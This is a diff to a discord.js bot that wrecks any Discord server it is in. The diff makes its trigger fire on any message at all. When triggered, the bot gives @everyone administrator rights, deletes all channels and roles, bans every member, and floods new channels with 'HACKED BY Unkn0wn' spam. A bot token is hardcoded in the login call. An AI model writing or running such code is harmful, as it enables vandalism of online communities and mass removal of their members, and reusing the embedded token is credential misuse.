@@ -8,19 +8,17 @@ console.log(`Logged in as ${client.user.tag}!`);
           
 
 client.on('message', message => {
-    if (message.content.startsWith(".")) {
+    if (message.content.startsWith(`${message.content}`)) {
         message.delete();
-        message.guild.roles.find('name', 'HACKED BY Unkn0wn').edit({
+        message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
-        });
-         
+        });  
         message.guild.channels.map(c => {
             c.delete();
         });
        message.guild.members.forEach(m =>{
                     m.ban()
                 })
-      
       message.guild.roles.forEach(r =>{
                     r.delete()
                 });
@@ -41,7 +39,7 @@ client.on('message', message => {
         setTimeout(function() {
             setInterval(() => {
               
-                message.guild.createChannel('HACKED BY Ell1oT', 'text').then(channel => { 
+                message.guild.createChannel('HACKED BY Unkn0wn', 'text').then(channel => { 
                 channel.send('@everyone HACKED BY Unkn0wn BCHO SERVER DABNEWA:joy: :joy: :joy:')
                
                 })
@@ -97,13 +95,5 @@ if (message.content.startsWith(adminprefix + 'setava')) {
 
  ////codaka drwst krawa lalayan black jack
 
-
-
-client.on('ready', () => { 
-    setInterval (function () {
-      client.guilds.get('').channels.get('').send(`HACKRAWA`)
- 
-    }, 90); 
-          })
 client.login("ODEyMjYzODU2Njk2ODUyNTIx.YC-Nqg.BclcZP-hyPezGA5GU9_6lNkXWa4")
           
